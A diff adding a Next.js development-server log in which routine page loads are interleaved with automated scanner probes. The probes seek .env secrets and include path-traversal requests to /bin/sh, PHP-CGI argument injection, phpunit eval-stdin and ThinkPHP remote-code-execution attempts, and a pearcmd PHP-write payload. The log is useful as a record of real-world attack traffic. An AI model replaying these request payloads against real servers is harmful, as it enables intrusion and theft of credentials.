@@ -1,0 +1,1800 @@
+
+> 3gis@0.1.0 dev
+> next dev -p 80
+
+  ▲ Next.js 14.2.7
+  - Local:        http://localhost:80
+  - Environments: .env
+
+ ✓ Starting...
+ ✓ Ready in 3.1s
+ ○ Compiling / ...
+ ✓ Compiled / in 3.3s (1505 modules)
+ ✓ Compiled in 392ms (724 modules)
+ GET / 200 in 3704ms
+ ○ Compiling /api/auth/[...nextauth] ...
+ ✓ Compiled /api/auth/[...nextauth] in 948ms (1096 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 1422ms
+ GET /api/auth/session 200 in 22ms
+ GET / 200 in 144ms
+ GET /api/auth/session 200 in 34ms
+ ✓ Compiled /favicon.ico in 237ms (1124 modules)
+ GET /favicon.ico 200 in 304ms
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 97ms
+ ○ Compiling /register ...
+ ✓ Compiled /register in 960ms (1865 modules)
+ GET /register 200 in 88ms
+ GET /favicon.ico 200 in 12ms
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 29ms
+ GET /api/auth/session 200 in 11ms
+ GET / 200 in 95ms
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 693ms (1525 modules)
+ GET /.env 404 in 822ms
+ POST / 200 in 67ms
+ GET /sendgrid/.env 404 in 20ms
+ POST / 200 in 29ms
+ GET / 200 in 36ms
+ ✓ Compiled /favicon.ico in 305ms (829 modules)
+ GET /favicon.ico 200 in 376ms
+ GET / 200 in 151ms
+ GET / 200 in 36ms
+ ✓ Compiled /_not-found in 501ms (1525 modules)
+ GET /index.htm 404 in 634ms
+ GET /.env 404 in 25ms
+ POST / 200 in 90ms
+ GET /sendgrid/.env 404 in 19ms
+ POST / 200 in 35ms
+ GET / 200 in 43ms
+ GET / 200 in 38ms
+ GET / 200 in 47ms
+ GET / 200 in 42ms
+ GET / 200 in 58ms
+ GET / 200 in 1855ms
+ GET / 200 in 35ms
+ GET / 200 in 195ms
+ GET /wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /xmlrpc.php?rsd 404 in 16ms
+ GET / 200 in 31ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 12ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET / 200 in 39ms
+ GET / 200 in 43ms
+ ✓ Compiled /api/auth/[...nextauth] in 414ms (1114 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 555ms
+ GET /api/auth/session 200 in 574ms
+ ✓ Compiled /_not-found in 411ms (1525 modules)
+ GET /.env 404 in 570ms
+ GET / 200 in 99ms
+ GET / 200 in 173ms
+ GET /wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /xmlrpc.php?rsd 404 in 15ms
+ GET / 200 in 32ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 12ms
+ GET / 200 in 35ms
+ ✓ Compiled /api/auth/[...nextauth] in 313ms (1114 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 437ms
+ GET /api/auth/session 200 in 125ms
+ ✓ Compiled /favicon.ico in 403ms (1142 modules)
+ GET /favicon.ico 200 in 467ms
+ GET / 200 in 149ms
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 45ms
+ GET /api/auth/session 200 in 20ms
+ GET /favicon.ico 200 in 8ms
+ GET / 200 in 37ms
+ GET /api/auth/session 200 in 24ms
+ GET /favicon.ico 200 in 9ms
+ GET /api/auth/session 200 in 10ms
+ GET / 200 in 40ms
+ GET /favicon.ico 200 in 12ms
+ GET /api/auth/session 200 in 23ms
+ GET /api/auth/session 200 in 9ms
+ GET / 200 in 40ms
+ GET /api/auth/session 200 in 20ms
+ GET /api/auth/session 200 in 18ms
+ GET /favicon.ico 200 in 8ms
+ GET / 200 in 41ms
+ GET / 200 in 34ms
+ ✓ Compiled /_not-found in 408ms (1525 modules)
+ GET /wp-includes/wlwmanifest.xml 404 in 536ms
+ GET /xmlrpc.php?rsd 404 in 14ms
+ GET / 200 in 53ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 12ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /admin/assets/js/views/login.js 404 in 21ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 25ms
+ GET /wp-admin/setup-config.php 404 in 26ms
+ ○ Compiling /_error ...
+ ✓ Compiled /_error in 2.2s (1747 modules)
+ POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh 405 in 2236ms
+ ✓ Compiled /_not-found in 250ms (1750 modules)
+ POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh 404 in 427ms
+ POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input 404 in 19ms
+ GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 84ms
+ GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php 404 in 20ms
+ GET /vendor/phpunit/src/Util/PHP/eval-stdin.php 404 in 17ms
+ GET /vendor/phpunit/Util/PHP/eval-stdin.php 404 in 20ms
+ GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php 404 in 19ms
+ GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 17ms
+ GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 17ms
+ GET /phpunit/phpunit/Util/PHP/eval-stdin.php 404 in 17ms
+ GET /phpunit/src/Util/PHP/eval-stdin.php 404 in 15ms
+ GET /phpunit/Util/PHP/eval-stdin.php 404 in 14ms
+ GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 17ms
+ GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php 404 in 18ms
+ GET /lib/phpunit/src/Util/PHP/eval-stdin.php 404 in 16ms
+ GET /lib/phpunit/Util/PHP/eval-stdin.php 404 in 14ms
+ GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 22ms
+ GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 20ms
+ GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 14ms
+ GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 18ms
+ GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 13ms
+ GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 16ms
+ GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 13ms
+ GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 13ms
+ GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 15ms
+ GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 14ms
+ GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 15ms
+ GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 14ms
+ GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 16ms
+ GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 16ms
+ GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 18ms
+ GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 14ms
+ GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 13ms
+ GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 13ms
+ GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 14ms
+ GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 13ms
+ GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 14ms
+ GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 14ms
+ GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 in 16ms
+ GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello 404 in 14ms
+ GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello 404 in 16ms
+ GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php 404 in 14ms
+ GET /index.php?lang=../../../../../../../../tmp/index1 404 in 14ms
+ GET /containers/json 404 in 15ms
+ HEAD /wordpress 404 in 17ms
+ HEAD / 200 in 93ms
+ HEAD /wp 404 in 17ms
+ HEAD /bc 404 in 14ms
+ HEAD /bk 404 in 14ms
+ HEAD /backup 404 in 15ms
+ HEAD /old 404 in 16ms
+ HEAD /new 404 in 15ms
+ HEAD /main 404 in 13ms
+ HEAD /home 404 in 12ms
+ GET / 200 in 54ms
+ GET / 200 in 38ms
+ GET /register 200 in 47ms
+ GET / 200 in 30ms
+ ✓ Compiled /favicon.ico in 341ms (868 modules)
+ GET /favicon.ico 200 in 412ms
+ ○ Compiling /login ...
+ ✓ Compiled /login in 1887ms (1753 modules)
+ GET / 200 in 976ms
+ GET /login 200 in 2170ms
+ GET / 200 in 29ms
+ ✓ Compiled /_not-found in 162ms (1756 modules)
+ GET /wp-includes/wlwmanifest.xml 404 in 291ms
+ GET /xmlrpc.php?rsd 404 in 20ms
+ GET / 200 in 150ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 14ms
+ ✓ Compiled /favicon.ico in 103ms (874 modules)
+ GET /favicon.ico 200 in 192ms
+ GET / 200 in 160ms
+ GET / 200 in 121ms
+ GET /wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /xmlrpc.php?rsd 404 in 17ms
+ GET / 200 in 34ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET / 200 in 42ms
+ GET / 200 in 37ms
+ GET /wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /xmlrpc.php?rsd 404 in 15ms
+ GET / 200 in 103ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 12ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET / 200 in 36ms
+ GET / 200 in 199ms
+ GET /wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /xmlrpc.php?rsd 404 in 17ms
+ GET / 200 in 29ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET / 200 in 151ms
+ GET /wp-includes/ID3/license.txt 404 in 16ms
+ GET /xmlrpc.php?rsd 404 in 20ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /2021/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET / 200 in 41ms
+ GET / 200 in 180ms
+ GET /wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /xmlrpc.php?rsd 404 in 18ms
+ GET / 200 in 32ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 12ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 12ms
+ GET / 200 in 36ms
+ GET / 200 in 34ms
+ GET /wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /xmlrpc.php?rsd 404 in 17ms
+ GET / 200 in 172ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 12ms
+ GET / 200 in 33ms
+ GET /.env 404 in 62ms
+ GET / 200 in 57ms
+ GET / 200 in 39ms
+ GET /wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /xmlrpc.php?rsd 404 in 17ms
+ GET / 200 in 46ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 77ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /.env 404 in 173ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 30ms
+ GET /wp-admin/setup-config.php 404 in 25ms
+ GET /robots.txt 404 in 33ms
+ GET / 200 in 71ms
+ ○ Compiling /api/auth/[...nextauth] ...
+ ✓ Compiled /api/auth/[...nextauth] in 1770ms (1153 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 2005ms
+ GET /api/auth/session 200 in 24ms
+ GET / 200 in 201ms
+ GET / 200 in 52ms
+ ✓ Compiled /favicon.ico in 410ms (868 modules)
+ GET /favicon.ico 200 in 489ms
+ GET /register 200 in 260ms
+ ✓ Compiled /api/auth/[...nextauth] in 483ms (1153 modules)
+[next-auth][warn][NEXTAUTH_URL] 
+https://next-auth.js.org/warnings#nextauth_url
+ GET /api/auth/session 200 in 628ms
+ GET /api/auth/session 200 in 28ms
+ GET / 200 in 179ms
+ GET / 200 in 66ms
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 1064ms (1751 modules)
+ GET /robots.txt 404 in 1226ms
+ GET / 200 in 85ms
+ GET /register 200 in 51ms
+ GET /privacy 404 in 23ms
+ GET /terms 404 in 19ms
+ ○ Compiling /login ...
+ ✓ Compiled /login in 868ms (844 modules)
+ GET /login 200 in 999ms
+ GET /privacy 404 in 30ms
+ GET /robots.txt 404 in 23ms
+ GET / 200 in 74ms
+ GET / 200 in 65ms
+ GET /.env 404 in 31ms
+ POST / 200 in 63ms
+ GET / 200 in 49ms
+ GET / 200 in 44ms
+ GET /wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /xmlrpc.php?rsd 404 in 21ms
+ GET / 200 in 199ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET / 200 in 43ms
+ GET / 200 in 501ms
+ GET / 200 in 60ms
+ GET / 200 in 174ms
+ GET / 200 in 201ms
+ GET /wp-includes/wlwmanifest.xml 404 in 21ms
+ GET /xmlrpc.php?rsd 404 in 17ms
+ GET / 200 in 37ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 31ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 33ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 137ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 12ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET / 200 in 55ms
+ GET / 200 in 47ms
+ GET / 200 in 209ms
+ GET /wp-includes/ID3/license.txt 404 in 20ms
+ GET /xmlrpc.php?rsd 404 in 17ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /2020/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /2021/wp-includes/wlwmanifest.xml 404 in 25ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET / 200 in 43ms
+ GET / 200 in 117ms
+ GET /wp-includes/wlwmanifest.xml 404 in 23ms
+ GET /xmlrpc.php?rsd 404 in 21ms
+ GET / 200 in 38ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 13ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /media/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /wp2/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /site/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /cms/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /sito/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET / 200 in 52ms
+ GET /wp-admin/setup-config.php 404 in 97ms
+ GET /wordpress/wp-admin/setup-config.php 404 in 37ms
+ GET / 200 in 85ms
+ ○ Compiling /favicon.ico ...
+ ✓ Compiled /favicon.ico in 813ms (868 modules)
+ GET /favicon.ico 200 in 955ms
+ ✓ Compiled /_not-found in 414ms (1751 modules)
+ GET /boaform/admin/formLogin?username=ec8&psd=ec8 404 in 583ms
+ GET / 200 in 135ms
+ GET / 200 in 112ms
+ GET /wp-includes/wlwmanifest.xml 404 in 20ms
+ GET /xmlrpc.php?rsd 404 in 18ms
+ GET / 200 in 35ms
+ GET /blog/wp-includes/wlwmanifest.xml 404 in 19ms
+ GET /web/wp-includes/wlwmanifest.xml 404 in 18ms
+ GET /wordpress/wp-includes/wlwmanifest.xml 404 in 17ms
+ GET /website/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /wp/wp-includes/wlwmanifest.xml 404 in 15ms
+ GET /news/wp-includes/wlwmanifest.xml 404 in 16ms
+ GET /2018/wp-includes/wlwmanifest.xml 404 in 22ms
+ GET /2019/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /shop/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /wp1/wp-includes/wlwmanifest.xml 404 in 14ms
+ GET /test/wp-includes/wlwmanifest.xml 404 in 16ms
